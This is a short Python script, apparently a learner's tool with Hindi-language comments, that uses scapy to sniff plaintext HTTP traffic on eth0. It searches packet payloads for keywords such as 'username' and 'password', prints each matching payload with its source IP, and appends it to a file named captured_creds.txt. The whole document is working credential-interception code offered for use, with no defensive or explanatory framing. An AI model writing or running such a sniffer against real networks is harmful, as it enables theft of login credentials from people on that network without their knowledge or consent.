from scapy.all import sniff, Raw, IP

keywords = ["username", "user", "pass", "password", "login"]

def process_packet(packet):
    if packet.haslayer(Raw):
        payload = str(packet[Raw].load)
        
        for word in keywords:
            if word in payload.lower():
                # Screen par dikhao
                output = f"\n[***] Sensitive Data: {packet[IP].src} -> {payload}\n"
                print(output)
                
                # File mein save karo ("a" ka matlab hai append - purane data ke niche likho)
                with open("captured_creds.txt", "a") as f:
                    f.write(output)
                break

print("[*] Monitoring & Logging... Check 'captured_creds.txt' for saved data.")
sniff(iface="eth0", filter="tcp port 80", prn=process_packet, store=0)